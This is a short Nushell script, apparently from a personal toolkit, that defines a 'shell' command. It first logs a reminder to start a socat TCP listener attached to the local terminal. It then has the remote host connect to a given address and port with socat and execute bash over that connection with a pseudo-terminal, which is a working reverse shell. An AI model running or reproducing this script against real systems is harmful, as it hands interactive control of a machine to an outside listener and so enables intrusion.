use utils.nu *
use lg.nu

export def shell [addr port] {
    # local

    lg o Ensure that $"`socat -d -d TCP-LISTEN:($port),reuseaddr FILE:\(tty\),raw,echo=0`" is running locally and is reachable.
    # remote
    socat TCP:($addr):($port) EXEC:'/usr/bash',pty,stderr,setsid,sigint,sane
}
